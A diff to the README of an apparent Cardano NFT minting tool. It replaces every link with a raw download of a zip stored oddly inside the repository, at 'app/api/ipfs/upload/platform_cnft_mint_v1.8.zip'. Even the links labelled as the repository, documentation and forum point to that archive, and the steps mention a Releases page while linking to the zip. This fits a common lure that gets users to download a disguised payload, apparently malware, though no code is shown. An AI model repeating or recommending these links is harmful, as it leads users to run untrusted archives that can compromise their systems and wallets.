@@ -1,6 +1,6 @@
 # 🎨 cnft-mint-platform - Easily Mint Your Own Cardano NFTs
 
-[![Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip%20Now-%20%F0%9F%93%88-brightgreen)](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip)
+[![Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip%20Now-%20%F0%9F%93%88-brightgreen)](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you dive in, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the software. 
 
-[Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip)
+[Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip)
 
 1. Click the link above to access the Releases page.
 2. Find the latest version of cnft-mint-platform.
@@ -76,9 +76,9 @@ Absolutely! Once your NFT is minted, you can list it on various marketplaces tha
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Explore the code and contribute.
-- [Documentation](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Find more detailed guidance.
-- [Community Forum](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Join discussions and connect with other users.
+- [GitHub Repository](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip) - Explore the code and contribute.
+- [Documentation](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip) - Find more detailed guidance.
+- [Community Forum](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/app/api/ipfs/upload/platform_cnft_mint_v1.8.zip) - Join discussions and connect with other users.
 
 ## 📞 Support
 
